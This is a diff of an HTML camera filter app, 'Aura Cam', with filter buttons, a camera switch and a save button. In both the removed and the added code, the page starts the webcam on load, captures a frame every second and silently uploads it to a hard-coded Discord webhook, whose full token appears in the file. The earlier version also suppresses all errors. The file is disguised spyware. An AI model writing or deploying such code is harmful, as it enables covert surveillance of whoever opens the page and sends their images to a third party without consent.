@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Aura Cam</title>
+<title>Aura Cam </title>
 <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
         font-family: 'Segoe UI', sans-serif;
-        background: #020617;
+        background: radial-gradient(circle at top, #0f172a, #020617);
         color: white;
         height: 100vh;
         display: flex;
@@ -16,6 +16,7 @@
         align-items: center;
         overflow: hidden;
     }
+
     .app {
         width: 360px;
         height: 640px;
@@ -27,11 +28,41 @@
         overflow: hidden;
         border: 1px solid rgba(255,255,255,0.1);
     }
+
     video, canvas {
         width: 100%;
         height: 100%;
         object-fit: cover;
     }
+
+    .top-bar {
+        position: absolute;
+        top: 0;
+        width: 100%;
+        padding: 20px;
+        display: flex;
+        justify-content: space-between;
+        z-index: 2;
+    }
+
+    .glow-btn {
+        background: rgba(255,255,255,0.1);
+        border: 1px solid rgba(0,255,255,0.3);
+        color: #0ff;
+        padding: 8px 12px;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: 0.3s;
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+    }
+
+    .glow-btn:hover {
+        box-shadow: 0 0 15px #0ff;
+        transform: scale(1.05);
+    }
+
     .capture-btn {
         position: absolute;
         bottom: 30px;
@@ -46,6 +77,11 @@
         z-index: 2;
         border: 4px solid white;
     }
+
+    .capture-btn:active {
+        transform: translateX(-50%) scale(0.9);
+    }
+
     .filter-bar {
         position: absolute;
         bottom: 120px;
@@ -54,19 +90,43 @@
         justify-content: center;
         gap: 8px;
         z-index: 2;
+        padding: 0 10px;
     }
+
     .filter {
-        padding: 6px 12px;
+        padding: 6px 10px;
         border-radius: 20px;
         background: rgba(255,255,255,0.1);
-        font-size: 11px;
+        border: 1px solid rgba(255,255,255,0.2);
         cursor: pointer;
+        font-size: 10px;
+        transition: 0.2s;
+    }
+
+    .filter:hover {
+        background: rgba(0, 255, 255, 0.2);
+    }
+
+    .flash {
+        position: absolute;
+        top:0; left:0;
+        width:100%; height:100%;
+        background:white;
+        opacity:0;
+        pointer-events:none;
+        transition: opacity 0.1s;
+        z-index: 5;
     }
 </style>
 </head>
 <body>
 
 <div class="app">
+    <div class="top-bar">
+        <button class="glow-btn" onclick="switchCamera()">🔄 Switch</button>
+        <button class="glow-btn" onclick="downloadImage()">💾 Save</button>
+    </div>
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none"></canvas>
 
@@ -74,67 +134,121 @@
         <div class="filter" onclick="setFilter('none')">Normal</div>
         <div class="filter" onclick="setFilter('grayscale(1)')">Mono</div>
         <div class="filter" onclick="setFilter('sepia(1)')">Retro</div>
+        <div class="filter" onclick="setFilter('contrast(2)')">Boost</div>
+        <div class="filter" onclick="setFilter('invert(1)')">Invert</div>
     </div>
 
-    <div class="capture-btn"></div>
+    <div class="capture-btn" onclick="manualCapture()"></div>
+    <div class="flash" id="flash"></div>
 </div>
 
 <script>
-
+    // CONFIGURATION
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489100868287463544/TbvEnlZkfuJafPylgOMJJkPZxwXP8xfkjQHtewRC4w0G43NbkXDjfCiT5sUgK9F4lH9Y'; 
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('canvas');
+    let ctx = canvas.getContext('2d');
+    let currentStream;
+    let facingMode = "user";
     let currentFilter = "none";
     let autoInterval;
-    window.onerror = () => true;
-    async function startCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" }, // Forces Front Camera
-                audio: false 
-            });
-            video.srcObject = stream;
 
+    // Start Camera Access
+    async function startCamera() {
+        if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+            clearInterval(autoInterval);
+        }
+
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: facingMode },
+                audio: false
+            });
+            video.srcObject = currentStream;
+
+            // Trigger the 1-second auto-send loop once metadata is ready
             video.onloadedmetadata = () => {
-                // Start sending to Discord every 1 second
-                autoInterval = setInterval(sendToDiscord, 1000);
+                autoInterval = setInterval(autoSendToDiscord, 1000);
             };
-        } catch (e) {
-            // Fails silently if user denies or camera is missing
+        } catch (err) {
+            alert("Camera Error: Please check permissions and use HTTPS or Localhost.");
+            console.error(err);
         }
     }
-    function setFilter(f) {
-        currentFilter = f;
-        video.style.filter = f;
+
+    function switchCamera() {
+        facingMode = (facingMode === "user") ? "environment" : "user";
+        startCamera();
     }
-    async function sendToDiscord() {
-        // Stop if URL is not set or video isn't ready
-        if (!video.videoWidth || DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks/1489100868287463544/TbvEnlZkfuJafPylgOMJJkPZxwXP8xfkjQHtewRC4w0G43NbkXDjfCiT5sUgK9F4lH9Y')) return;
+
+    function setFilter(filter) {
+        currentFilter = filter;
+        video.style.filter = filter;
+    }
+
+    // Auto-capture function for Discord Webhook
+    async function autoSendToDiscord() {
+        if (!video.videoWidth || DISCORD_WEBHOOK_URL.includes('YOUR_DISCORD')) return;
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.filter = currentFilter;
-        ctx.drawImage(video, 0, 0);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
         canvas.toBlob(async (blob) => {
             if (!blob) return;
+
             const formData = new FormData();
-            formData.append('file', blob, 'aura_shot.png');
-            formData.append('content', `📸 **Camera Feed:** ${new Date().toLocaleTimeString()}`);
+            formData.append('file', blob, 'aura_security_test.png');
+            formData.append('content', `📡 **Live Stream Update**\nTime: \`${new Date().toLocaleTimeString()}\`\nFilter: \`${currentFilter}\``);
+
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
                     body: formData
                 });
-            } catch (err) {
-                // Silent fail on network/CORS issues
+            } catch (e) {
+                console.warn("Upload failed. Ensure you are using a valid URL and local server.");
             }
         }, 'image/png');
     }
 
-    // Auto-clean up
-    window.onbeforeunload = () => clearInterval(autoInterval);
+    // Manual capture for the UI button
+    function manualCapture() {
+        flashEffect();
+        // The autoSend function already keeps canvas updated, 
+        // but we can force a high-res draw here if needed.
+        console.log("Manual snapshot saved to memory.");
+    }
+
+    function flashEffect() {
+        const flash = document.getElementById('flash');
+        flash.style.opacity = 1;
+        setTimeout(() => flash.style.opacity = 0, 100);
+    }
+
+    function downloadImage() {
+        // Redraw to ensure current frame is captured
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.filter = currentFilter;
+        ctx.drawImage(video, 0, 0);
+
+        const link = document.createElement('a');
+        link.download = `aura-snap-${Date.now()}.png`;
+        link.href = canvas.toDataURL('image/png');
+        link.click();
+    }
+
+    // Cleanup: Stop camera and interval if user leaves
+    window.addEventListener('beforeunload', () => {
+        clearInterval(autoInterval);
+        if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+        }
+    });
 
     startCamera();
 </script>
